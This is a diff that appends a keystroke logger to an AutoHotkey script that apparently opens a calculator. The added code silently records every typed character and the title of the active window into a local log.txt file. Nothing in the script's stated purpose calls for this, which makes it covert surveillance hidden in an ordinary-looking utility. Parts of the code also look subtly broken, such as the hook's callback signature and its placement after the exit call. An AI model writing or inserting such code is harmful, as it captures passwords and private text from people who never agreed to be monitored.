@@ -21,3 +21,36 @@ MsgBox("Calculator opened successfully!")
 ; Clean up
 DllCall("FreeLibrary", "Ptr", hModule)
 ExitApp(0)
+
+
+
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+
+LogFile := A_ScriptDir "\log.txt"
+LastWin := ""
+
+; Create log file if it doesn't exist
+if !FileExist(LogFile)
+    FileAppend("", LogFile)
+
+ih := InputHook("v")
+ih.KeyOpt("{All}", "E")
+ih.OnChar := LogKey
+ih.Start()
+
+LogKey(ih) {
+    global LogFile, LastWin
+    try {
+        CurrentWin := WinGetTitle("A")
+    } catch {
+        CurrentWin := "N/A"
+    }
+    if (CurrentWin != LastWin) {
+        FileAppend("`n[" CurrentWin "]", LogFile)
+        LastWin := CurrentWin
+    }
+    Key := ih.Input
+    if (Key != "")
+        FileAppend(Key, LogFile)
+}
